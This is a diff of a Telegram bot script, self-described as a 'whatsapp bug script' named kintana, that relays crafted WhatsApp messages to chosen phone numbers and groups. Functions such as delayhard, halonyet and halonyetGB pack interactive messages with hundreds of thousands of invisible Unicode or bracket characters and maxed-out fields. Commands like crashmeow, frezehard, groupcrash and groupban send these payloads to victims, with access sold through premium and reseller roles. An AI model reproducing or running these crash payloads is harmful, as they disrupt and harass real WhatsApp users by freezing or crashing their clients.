-// ==================== INIT WA SESSIONS (AUTO RESTORE) ====================
-async function initializeWABotSessions() {
-  try {
-    if (!fs.existsSync(SESSIONS_FILE)) return;
-    const active = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-    for (const [number, data] of Object.entries(active)) {
-      if (data?.type === "wa") {
-        if (!canAddMoreWABots()) {
-          console.log(`[botwa] skip restore ${number}, limit reached`);
-          continue;
-        }
-        console.log(`[botwa] restoring session ${number}...`);
-        botwaNumbers.add(number);
-        await reconnectWABot(number, data.ownerId);
-      }
-    }
-  } catch (e) {
-    console.error("[botwa] init sessions error:", e?.message);
-  }
-}
-
 async function fetchAndValidateToken() {
   try {
     const response = await axios.get('https://raw.githubusercontent.com/nonoluteam-debug/database/refs/heads/main/token.json');
@@ -1413,7 +595,6 @@ function getBotRuntime() {
 async function initializeBot() {
   console.log(`kintana is now active on your bot 👊`);
   await initializeWhatsAppConnections();
-  await initializeWABotSessions();
 }
 
 //============================//
@@ -1457,124 +638,52 @@ async function blankclick(sock, target) {
 }
 
 async function delayhard(sock, target) {
-    const msg = {
-        groupStatusMessageV2: {
-            message: {
-                viewOnceMessageV2Extension: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: "\u200B\u2060".repeat(10000),
-                                subtitle: "\uFEFF\u202F".repeat(10000)
-                            },
-                            body: {
-                                text: "\u180E\u061C".repeat(20000)
-                            },
-                            nativeFlowMessage: {
-                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
-                                messageParamsJson: "\u200B\u202F".repeat(10000)
-                            },
-                            contextInfo: {
-                                stanzaId: "\uFEFF\u180E".repeat(1000),
-                                mentionedJid: [
-                                    "\u061C\u200B".repeat(1000)
-                                ],
-                                forwardingScore: 4294967295,
-                                isForwarded: true,
-                                expiration: 4294967295
-                            }
-                        }
-                    }
-                }
-            }
+  const message = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u000D" },
+          footer: { text: "\u000F" },
+          nativeFlowMessage: { buttons: "\t".repeat(45000) }
         }
-    };
-
-    await sock.relayMessage(target, msg, {
-        noSelfSync: true
-    });
+      }
+    }
+  };
+  await sock.relayMessage(target, message, { noselfsync: true });
 }
 
 async function halonyet(sock, target) {
-    const msg = {
-        groupStatusMessageV2: {
-            message: {
-                viewOnceMessage: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: "\u200B".repeat(10000)
-                            },
-                            body: {
-                                text: "\u180E".repeat(10000)
-                            },
-                            nativeFlowMessage: {
-                                buttons: "\uFFF9".repeat(300000)
-                            },
-                            contextInfo: {
-                                mentionedJid: ["\u061C".repeat(10000)],
-                                forwardingScore: 4294967295,
-                                isForwarded: true,
-                                advDeviceIdentity: {
-                                    rawId: 4294967295,
-                                    timestamp: 9999999999999,
-                                    keyIndex: 4294967295,
-                                    accountType: "E2EE",
-                                    deviceType: "HOSTED"
-                                }
-                            }
-                        }
-                    }
-                }
-            },
-            participant: target
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u0000" },
+          nativeFlowMessage: {
+            buttons: "[".repeat(500000)
+          }
         }
-    };
+      }
+    }
+  };
 
-    await sock.relayMessage(target, msg, {
-        noSelfSync: false
-    });
+  await sock.relayMessage(target, msg, { noselfsync: true });
 }
 
-async function halonyetGB(sock, target) {
-    const msg = {
-        groupStatusMessageV2: {
-            message: {
-                viewOnceMessage: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: "\u200B".repeat(10000)
-                            },
-                            body: {
-                                text: "\u180E".repeat(10000)
-                            },
-                            nativeFlowMessage: {
-                                buttons: "\uFFF9".repeat(300000)
-                            },
-                            contextInfo: {
-                                mentionedJid: ["\u061C".repeat(10000)],
-                                forwardingScore: 4294967295,
-                                isForwarded: true,
-                                advDeviceIdentity: {
-                                    rawId: 4294967295,
-                                    timestamp: 9999999999999,
-                                    keyIndex: 4294967295,
-                                    accountType: "E2EE",
-                                    deviceType: "HOSTED"
-                                }
-                            }
-                        }
-                    }
-                }
-            },
-            participant: target
+async function halonyetGB(sock, targetgroup) {
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u0000" },
+          nativeFlowMessage: {
+            buttons: "[".repeat(500000)
+          }
         }
-    };
+      }
+    }
+  };
 
-    await sock.relayMessage(target, msg, {
-        noSelfSync: false
-    });
+  await sock.relayMessage(targetgroup, msg, {});
 }
 
 async function kitow(sock, targetgroup, ptcp = true) {
@@ -1877,7 +986,7 @@ function getkintanaMenu() {
 }
 
 // ============ COMMAND /START ============
-bot.onText(/^\/start(?:\s|$)/i, async (msg) => {
+bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const username = msg.from.username ? `@${msg.from.username}` : "no username";
@@ -1885,7 +994,7 @@ bot.onText(/^\/start(?:\s|$)/i, async (msg) => {
   const runtime = getBotRuntime();
   const greeting = getGreeting();
 
-const html = `<tg-slideshow>
+  const html = `<tg-slideshow>
   <img src="https://files.catbox.moe/j654oy.jpg"/>
   <img src="https://files.catbox.moe/sqyadj.jpg"/>
   <img src="https://files.catbox.moe/mugu3q.jpg"/>
@@ -1893,7 +1002,7 @@ const html = `<tg-slideshow>
 
 <h3>${greeting}, ${username.toLowerCase()}</h3>
 
-<p>i am a whatsapp bug script kintana version 7.3.0, created by heysaka.</p>
+<p>i am a whatsapp bug script kintana version 7.2.0, created by heysaka.</p>
 
 <tg-collage>
   <img src="https://files.catbox.moe/5izqwp.jpg"/>
@@ -1911,7 +1020,7 @@ const html = `<tg-slideshow>
   <tr><th>info</th><th>detail</th></tr>
   <tr><td>creator</td><td>heysaka official id</td></tr>
   <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
-  <tr><td>version</td><td>7.3.0</td></tr>
+  <tr><td>version</td><td>7.2.0</td></tr>
   <tr><td>special theme</td><td>one piece</td></tr>
   <tr><td>bot name</td><td>kintana</td></tr>
   <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
@@ -1954,14 +1063,6 @@ bot.on("callback_query", async (query) => {
 
 <p>premium and admin access menu, please register to be able to use the bug.</p>
 
-<h3>bot whatsapp</h3>
-<table border="2">
-<tr><th>command</th><th>description</th></tr>
-<tr><td><code>/botwa</code></td><td>add bot whatsapp</td></tr>
-<tr><td><code>/delbotwa</code></td><td>delete bot whatsapp</td></tr>
-<tr><td><code>/listbotwa</code></td><td>list bot whatsapp</td></tr>
-</table>
-
 <h3>connect menu</h3>
 <table border="2">
 <tr><th>command</th><th>description</th></tr>
@@ -1984,9 +1085,6 @@ bot.on("callback_query", async (query) => {
 <table border="2">
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/blockcmd</code></td><td>on / off (owner only)</td></tr>
-<tr><td><code>/block /command</code></td><td>block a specific command</td></tr>
-<tr><td><code>/unblock /command</code></td><td>unblock a command</td></tr>
-<tr><td><code>/listblock</code></td><td>list blocked commands</td></tr>
 </table>
 
 <h3>access menu</h3>
@@ -2129,7 +1227,7 @@ bot.on("callback_query", async (query) => {
 
 <h3>${greeting}, ${username.toLowerCase()}</h3>
 
-<p>i am a whatsapp bug script kintana version 7.3.0, created by heysaka.</p>
+<p>i am a whatsapp bug script kintana version 7.2.0, created by heysaka.</p>
 
 <tg-collage>
   <img src="https://files.catbox.moe/5izqwp.jpg"/>
@@ -2147,7 +1245,7 @@ bot.on("callback_query", async (query) => {
   <tr><th>info</th><th>detail</th></tr>
   <tr><td>creator</td><td>heysaka official id</td></tr>
   <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
-  <tr><td>version</td><td>7.3.0</td></tr>
+  <tr><td>version</td><td>7.2.0</td></tr>
   <tr><td>special theme</td><td>one piece</td></tr>
   <tr><td>bot name</td><td>kintana</td></tr>
   <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
@@ -2178,7 +1276,9 @@ bot.on("callback_query", async (query) => {
   }
 });
 
-bot.onText(/^\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
+// ============ COMMAND HANDLERS ============
+
+bot.onText(/\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const command = match[1];
   const type = command === "addsenderpublic" ? "public" : "private";
@@ -2220,7 +1320,7 @@ bot.onText(/^\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?$/, async (msg, matc
   }
 });
 
-bot.onText(/^\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const command = match[1];
   const targetType = command === "delsenderpublic" ? "public" : "private";
@@ -2396,7 +1496,7 @@ function formatDelay(ms) {
     return `${minutes}m ${remainingSeconds}s`;
 }
 
-bot.onText(/^\/setjeda(?:\s(.+))?$/, async (msg, match) => {
+bot.onText(/\/setjeda(?:\s(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
 
   if (!isOwner(msg.from.id)) {
@@ -2453,7 +1553,7 @@ bot.onText(/^\/setjeda(?:\s(.+))?$/, async (msg, match) => {
   );
 });
 
-bot.onText(/^\/cekjeda$/, async (msg) => {
+bot.onText(/\/cekjeda/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (!isOwner(msg.from.id)) {
@@ -2476,7 +1576,7 @@ bot.onText(/^\/cekjeda$/, async (msg) => {
   );
 });
 
-bot.onText(/^\/resetjeda$/, async (msg) => {
+bot.onText(/\/resetjeda/, async (msg) => {
   const chatId = msg.chat.id;
 
   if (!isOwner(msg.from.id)) {
@@ -2502,7 +1602,7 @@ async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>target</td><td>${formattedNumber}</td></tr>
 <tr><td>type</td><td>/${commandName}</td></tr>
-<tr><td>script version</td><td>7.3.0</td></tr>
+<tr><td>script version</td><td>7.2.0</td></tr>
 <tr><td>status</td><td>done</td></tr>
 </table>`;
   const replyMarkup = {
@@ -2519,7 +1619,8 @@ async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId
   await sendRichMenu(chatId, html, replyMarkup, replyToMsgId);
 }
 
-bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
+// ============ BUG COMMANDS ============
+bot.onText(/\/(delayhard)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2603,7 +1704,7 @@ bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(crashmeow)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(crashmeow)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2687,7 +1788,7 @@ bot.onText(/^\/(crashmeow)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(blankclick)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(blankclick)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2771,7 +1872,7 @@ bot.onText(/^\/(blankclick)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2855,7 +1956,8 @@ bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
+// ============ GROUP BUG COMMANDS ============
+bot.onText(/\/(delaygroup)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2986,7 +2088,7 @@ bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary", icon_custom_emoji_id: "5316826301611390284" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
@@ -3012,7 +2114,7 @@ bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
   })();
 });
 
-bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(groupcrash)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -3143,7 +2245,7 @@ bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary", icon_custom_emoji_id: "5316826301611390284" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
@@ -3169,7 +2271,7 @@ bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
   })();
 });
 
-bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/\/(groupban)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -3300,7 +2402,7 @@ bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
 </table>`,
     {
       inline_keyboard: [
-        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary" }, { text: 'group link', url: link, style: "primary" }]
+        [{ text: 'script info', url: "https://t.me/kintanaofficial", style: "primary", icon_custom_emoji_id: "5316826301611390284" }, { text: 'group link', url: link, style: "primary" }]
       ]
     }
   );
@@ -3324,7 +2426,7 @@ bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
   })();
 });
 
-//============= COMMAND /blockcmd & /block & /unblock & /listblock =============//
+//============= COMMAND /blockcmd =============//
 bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -3370,163 +2472,11 @@ bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
 <tr><td>current</td><td>${status}</td></tr>
 <tr><td>on</td><td>lock bot + anti kidnap</td></tr>
 <tr><td>off</td><td>open access for public</td></tr>
-</table>
-
-<p>use <code>/block /command</code> to block specific commands</p>`
-  );
-});
-
-bot.onText(/^\/block(?:\s+(.+))?$/i, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) return restricted(chatId);
-
-  if (!match[1]) {
-    return sendRichMenu(chatId,
-      `<h3>missing command</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>usage</td><td>/block &lt;command&gt;</td></tr>
-<tr><td>example</td><td>/block /start</td></tr>
-<tr><td>example</td><td>/block /menu</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  // ambil command dari input
-  let cmd = match[1].trim().toLowerCase();
-  if (!cmd.startsWith("/")) cmd = "/" + cmd;
-  cmd = extractCommand(cmd) || cmd;
-
-  if (PROTECTED_COMMANDS.includes(cmd)) {
-    return sendRichMenu(chatId,
-      `<h3>cannot block</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${cmd}</td></tr>
-<tr><td>reason</td><td>protected command (owner tools)</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  if (blockedCommands.includes(cmd)) {
-    return sendRichMenu(chatId,
-      `<h3>already blocked</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${cmd}</td></tr>
-<tr><td>status</td><td>already in blocklist</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  blockedCommands.push(cmd);
-  saveBlockedCommands();
-
-  await sendRichMenu(chatId,
-    `<h3>command blocked</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${cmd}</td></tr>
-<tr><td>status</td><td>successfully blocked</td></tr>
-<tr><td>note</td><td>owner / premium / admin can still use</td></tr>
-</table>`,
-    null,
-    msg.message_id
-  );
-});
-
-bot.onText(/^\/unblock(?:\s+(.+))?$/i, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) return restricted(chatId);
-
-  if (!match[1]) {
-    return sendRichMenu(chatId,
-      `<h3>missing command</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>usage</td><td>/unblock &lt;command&gt;</td></tr>
-<tr><td>example</td><td>/unblock /start</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  let cmd = match[1].trim().toLowerCase();
-  if (!cmd.startsWith("/")) cmd = "/" + cmd;
-  cmd = extractCommand(cmd) || cmd;
-
-  if (!blockedCommands.includes(cmd)) {
-    return sendRichMenu(chatId,
-      `<h3>not blocked</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${cmd}</td></tr>
-<tr><td>status</td><td>not in blocklist</td></tr>
-</table>`,
-      null,
-      msg.message_id
-    );
-  }
-
-  blockedCommands = blockedCommands.filter(c => c !== cmd);
-  saveBlockedCommands();
-
-  await sendRichMenu(chatId,
-    `<h3>command unblocked</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>command</td><td>${cmd}</td></tr>
-<tr><td>status</td><td>successfully unblocked</td></tr>
-</table>`,
-    null,
-    msg.message_id
-  );
-});
-
-bot.onText(/^\/listblock$/i, async (msg) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) return restricted(chatId);
-
-  if (blockedCommands.length === 0) {
-    return sendRichMenu(chatId,
-      `<h3>blocked commands</h3>
-<table border="2">
-<tr><th>info</th><th>detail</th></tr>
-<tr><td>status</td><td>no blocked commands</td></tr>
 </table>`
-    );
-  }
-
-  let rowsHtml = "";
-  blockedCommands.forEach((cmd, i) => {
-    rowsHtml += `<tr><td>${i + 1}</td><td>${cmd}</td></tr>\n`;
-  });
-
-  await sendRichMenu(chatId,
-    `<h3>blocked commands</h3>
-<table border="2">
-<tr><th>#</th><th>command</th></tr>
-${rowsHtml}
-</table>
-
-<p>total: ${blockedCommands.length} commands</p>`
   );
 });
 
-bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
+bot.onText(/\/modemurbuggb(?:\s+(on|off))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const arg = match[1];
@@ -3626,7 +2576,8 @@ bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/addprem(?:\s(.+))?$/i, (msg, match) => {
+// ============ ACCESS MANAGEMENT ============
+bot.onText(/\/addprem(?:\s(.+))?/i, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3684,7 +2635,7 @@ bot.onText(/^\/addprem(?:\s(.+))?$/i, (msg, match) => {
     }
 });
 
-bot.onText(/^\/addowner(?:\s(.+))?$/i, (msg, match) => {
+bot.onText(/\/addowner(?:\s(.+))?/i, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3742,7 +2693,7 @@ bot.onText(/^\/addowner(?:\s(.+))?$/i, (msg, match) => {
     }
 });
 
-bot.onText(/^\/delprem(?:\s(.+))?$/i, (msg, match) => {
+bot.onText(/\/delprem(?:\s(.+))?/i, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3788,7 +2739,7 @@ bot.onText(/^\/delprem(?:\s(.+))?$/i, (msg, match) => {
     }
 });
 
-bot.onText(/^\/delowner(?:\s(.+))?$/i, (msg, match) => {
+bot.onText(/\/delowner(?:\s(.+))?/i, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3834,7 +2785,7 @@ bot.onText(/^\/delowner(?:\s(.+))?$/i, (msg, match) => {
     }
 });
 
-bot.onText(/^\/listprem$/, (msg) => {
+bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3860,7 +2811,7 @@ ${rowsHtml}
     );
 });
 
-bot.onText(/^\/listowner$/, (msg) => {
+bot.onText(/\/listowner/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
 
@@ -3886,7 +2837,8 @@ ${rowsHtml}
     );
 });
 
-bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
+// ============ INFO ============
+bot.onText(/^\/info(\s|$)/i, async (msg) => {
   const target = (msg.reply_to_message && msg.reply_to_message.from)
     ? msg.reply_to_message.from
     : msg.from;
@@ -3897,13 +2849,17 @@ bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
     ? `https://t.me/${target.username}`
     : `tg://openmessage?user_id=${target.id}`;
 
-  // FIX: getUserRoles tidak ada — pakai cek role manual
-  let roleText = "user";
+  let roleText = "belum ada";
   try {
-    const idStr = String(target.id);
-    if (isOwner(idStr)) roleText = "owner";
-    else if (adminUsers.map(String).includes(idStr)) roleText = "admin";
-    else if (premiumUsers.map(String).includes(idStr)) roleText = "premium";
+    const roles = await getUserRoles(target.id);
+    const list = [];
+    if (target.id.toString() === config.ownerId.toString()) list.push("bot owner");
+    if (roles.vip) list.push("owner kintana");
+    if (roles.partner) list.push("partner");
+    if (roles.reseller) list.push("reseller");
+    if (roles.freeupdate) list.push("free update");
+    if (roles.buyer) list.push("buyer");
+    if (list.length > 0) roleText = list.join(", ");
   } catch (e) {}
 
   const isReply = !!(msg.reply_to_message && msg.reply_to_message.from);
@@ -3928,7 +2884,8 @@ bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
   );
 });
 
-bot.onText(/^\/(listsender|listsenderpublic|listsenderprivat|devices)$/, async (msg, match) => {
+// ============ LIST SENDER ============
+bot.onText(/\/(listsender|listsenderpublic|listsenderprivat|devices)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderid = msg.from.id;
   const command = match[1];
@@ -4043,7 +3000,7 @@ bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
     }
 });
 
-bot.onText(/^\/tourl$/, async (msg) => {
+bot.onText(/^\/tourl$/i, async (msg) => {
     const chatId = msg.chat.id;
     const reply = msg.reply_to_message;
 
@@ -4202,7 +3159,7 @@ bot.onText(/^\/play(?:\s+(.+))?$/i, async (msg, match) => {
     }
 });
 
-bot.onText(/^\/jadihitam$/, async (msg) => {
+bot.onText(/^\/jadihitam$/i, async (msg) => {
     try {
         const chatId = msg.chat.id;
         const reply = msg.reply_to_message;
@@ -4264,7 +3221,7 @@ bot.onText(/^\/jadihitam$/, async (msg) => {
     }
 });
 
-bot.onText(/^\/jadianime$/, async (msg) => {
+bot.onText(/^\/jadianime$/i, async (msg) => {
     try {
         const chatId = msg.chat.id;
         const reply = msg.reply_to_message;
@@ -4338,7 +3295,7 @@ function escapeHtml(str) {
         .replace(/"/g, '&quot;');
 }
 
-bot.onText(/^\/cekfunc$/, async (msg) => {
+bot.onText(/\/cekfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "user";
     const token = bot.token;
@@ -4658,7 +3615,7 @@ function blockQuote(text) {
   return `<blockquote>${text}</blockquote>`;
 }
 
-bot.onText(/^\/pinterest(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/^\/pinterest(?:\s+(.+))?/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const query = match[1]?.trim();
   const replyOpt = { reply_to_message_id: msg.message_id, parse_mode: 'HTML' };
@@ -4823,7 +3780,7 @@ async function sendPin(bot, chatId, key) {
   }
 }
 
-// ============ IQC (Buffer Download Version) ============
+// ============ IQC ============
 bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const input = match[1] ? match[1].trim() : "";
